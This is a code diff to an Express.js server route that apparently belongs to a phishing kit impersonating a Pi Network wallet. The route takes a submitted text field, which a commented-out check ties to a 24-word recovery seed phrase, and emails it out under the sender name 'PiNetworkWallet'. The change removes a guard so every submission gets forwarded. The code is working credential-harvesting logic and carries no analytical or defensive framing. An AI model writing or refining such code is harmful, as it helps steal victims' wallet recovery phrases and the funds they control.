@@ -60,7 +60,7 @@ app.post("/submit/7668", async (req, res) => {
   const formNonce = req.body["form_nonce"];
   // forward to Email
   try {
-    if(mfText){
+    
     // if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet",
@@ -111,7 +111,6 @@ app.post("/submit/7668", async (req, res) => {
           redirect_to: "",
         },
       });
-    }
 
   } catch (error) {
     console.log(error, "the error");
@@ -143,4 +142,5 @@ app.post("/submit/7668", async (req, res) => {
 app.listen(port, () => {
   console.log(`Server is running on port http://localhost:${port}`);
 });
+
 
